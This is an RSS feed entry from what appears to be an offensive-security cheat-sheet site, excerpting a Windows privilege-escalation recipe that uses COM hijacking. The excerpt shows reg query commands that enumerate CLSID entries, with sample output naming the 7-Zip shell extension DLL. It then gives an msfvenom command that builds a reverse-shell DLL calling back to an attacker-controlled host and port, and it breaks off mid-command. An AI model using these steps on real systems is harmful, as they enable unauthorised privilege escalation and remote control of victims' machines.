channel.title: Windows Internals on TLDRBins
channel.description: Recent content in Windows Internals on TLDRBins

item.title: Registry
item.description: Privesc #1: COM Hijacking Windows 1. Query Registry # Queries all CLSID entries recursively reg query HKCR\CLSID /s # Queries CLSID entries containing KEYWORD recursively reg query HKCR\CLSID /s /f "<KEYWORD>" PS C:\Windows\system32> reg query HKCR\CLSID /s /f "zip" reg query HKCR\CLSID /s /f "zip" HKEY_CLASSES_ROOT\CLSID\{2317---[SNIP]---20000} (Default) REG_SZ 7-Zip Shell Extension HKEY_CLASSES_ROOT\CLSID\{2317---[SNIP]---20000}\InprocServer32 (Default) REG_SZ C:\Program Files\7-Zip\7-zip.dll ---[SNIP]--- 2. Create Malicious DLL msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f dll --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> > rev.
